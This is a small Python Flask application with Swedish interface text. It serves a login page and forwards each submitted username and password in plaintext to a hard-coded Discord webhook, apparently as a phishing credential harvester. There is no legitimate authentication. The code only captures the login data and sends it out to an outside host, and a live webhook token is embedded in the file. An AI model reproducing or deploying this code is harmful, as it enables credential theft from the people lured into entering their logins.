from flask import Flask, request, render_template
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1386382592961413190/xlCNZeYivytcj8rSXnEyaX-u7lnaxyEpYfHKrGz1laYoLdKAXT9Jk45ITU1cJxr-clJ3"

@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    user = request.form["username"]
    pwd = request.form["password"]

    payload = {"content": f"**Ny inloggning**\nAnvändare: {user}\nLösenord: {pwd}"}
    resp = requests.post(WEBHOOK_URL, json=payload)

    if resp.ok:
        return "👍 Skickat! Gå tillbaka till formuläret."
    else:
        return f"🔴 Fel vid skick: {resp.status_code}", 500

if __name__ == "__main__":
    app.run(debug=True)  
